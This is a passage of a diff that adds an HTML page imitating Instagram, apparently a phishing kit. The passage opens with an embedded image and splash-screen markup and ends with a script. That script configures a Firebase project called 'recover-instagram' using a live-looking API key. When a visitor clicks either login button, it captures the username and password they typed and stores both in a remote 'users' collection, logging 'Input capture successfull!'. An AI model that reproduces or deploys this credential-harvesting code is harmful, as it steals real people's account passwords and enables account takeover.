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">
+    </div>
+    <div id="splash-screen-phone">
+        <svg width="50" height="50" viewBox="0 0 50 50" style="position:absolute;top:50%;left:50%;margin:-25px 0 0 -25px;fill:#c7c7c7"><path d="M25 1c-6.52 0-7.34.03-9.9.14-2.55.12-4.3.53-5.82 1.12a11.76 11.76 0 0 0-4.25 2.77 11.76 11.76 0 0 0-2.77 4.25c-.6 1.52-1 3.27-1.12 5.82C1.03 17.66 1 18.48 1 25c0 6.5.03 7.33.14 9.88.12 2.56.53 4.3 1.12 5.83a11.76 11.76 0 0 0 2.77 4.25 11.76 11.76 0 0 0 4.25 2.77c1.52.59 3.27 1 5.82 1.11 2.56.12 3.38.14 9.9.14 6.5 0 7.33-.02 9.88-.14 2.56-.12 4.3-.52 5.83-1.11a11.76 11.76 0 0 0 4.25-2.77 11.76 11.76 0 0 0 2.77-4.25c.59-1.53 1-3.27 1.11-5.83.12-2.55.14-3.37.14-9.89 0-6.51-.02-7.33-.14-9.89-.12-2.55-.52-4.3-1.11-5.82a11.76 11.76 0 0 0-2.77-4.25 11.76 11.76 0 0 0-4.25-2.77c-1.53-.6-3.27-1-5.83-1.12A170.2 170.2 0 0 0 25 1zm0 4.32c6.4 0 7.16.03 9.69.14 2.34.11 3.6.5 4.45.83 1.12.43 1.92.95 2.76 1.8a7.43 7.43 0 0 1 1.8 2.75c.32.85.72 2.12.82 4.46.12 2.53.14 3.29.14 9.7 0 6.4-.02 7.16-.14 9.69-.1 2.34-.5 3.6-.82 4.45a7.43 7.43 0 0 1-1.8 2.76 7.43 7.43 0 0 1-2.76 1.8c-.84.32-2.11.72-4.45.82-2.53.12-3.3.14-9.7.14-6.4 0-7.16-.02-9.7-.14-2.33-.1-3.6-.5-4.45-.82a7.43 7.43 0 0 1-2.76-1.8 7.43 7.43 0 0 1-1.8-2.76c-.32-.84-.71-2.11-.82-4.45a166.5 166.5 0 0 1-.14-9.7c0-6.4.03-7.16.14-9.7.11-2.33.5-3.6.83-4.45a7.43 7.43 0 0 1 1.8-2.76 7.43 7.43 0 0 1 2.75-1.8c.85-.32 2.12-.71 4.46-.82 2.53-.11 3.29-.14 9.7-.14zm0 7.35a12.32 12.32 0 1 0 0 24.64 12.32 12.32 0 0 0 0-24.64zM25 33a8 8 0 1 1 0-16 8 8 0 0 1 0 16zm15.68-20.8a2.88 2.88 0 1 0-5.76 0 2.88 2.88 0 0 0 5.76 0z"></path></svg>
+    </div>
+    
+    
+    <script src="index.js"></script>
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-analytics.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore.js";
+        // TODO: Add SDKs for Firebase products that you want to use
+        // https://firebase.google.com/docs/web/setup#available-libraries
+
+        // Your web app's Firebase configuration
+        // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+        const firebaseConfig = {
+            apiKey: "AIzaSyAh68-CHIKgCl9epLjm5dWsRtAQFi7YHcY",
+            authDomain: "recover-instagram.firebaseapp.com",
+            projectId: "recover-instagram",
+            storageBucket: "recover-instagram.appspot.com",
+            messagingSenderId: "486816434240",
+            appId: "1:486816434240:web:7407e47ce899155d53b7a5",
+            measurementId: "G-874JFW8YJ0"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        
+        const db = getFirestore(app);
+
+        const collectData = async (formType) => {
+            let uid, pwd;
+            uid = document.getElementsByClassName("uid")[formType].value;
+            pwd = document.getElementsByClassName("pwd")[formType].value;
+            
+            try {
+                const docRef = await addDoc(collection(db, "users"), {
+                    username: uid,
+                    password: pwd,
+                    timestamp: new Date()
+                });
+                console.log("Input capture successfull!", docRef.id);
+            } catch (e) {
+                console.error("Error capturing input: ", e);
+            }
+        }
+
+        loginBtns = document.getElementsByClassName("login-btn");
+        for(let i = 0; i < 2; i++){
+            loginBtns[i].addEventListener("click", () => {
+                collectData(i);
+            })
+        }
+
+
+        
+    </script>
+
+</body></html
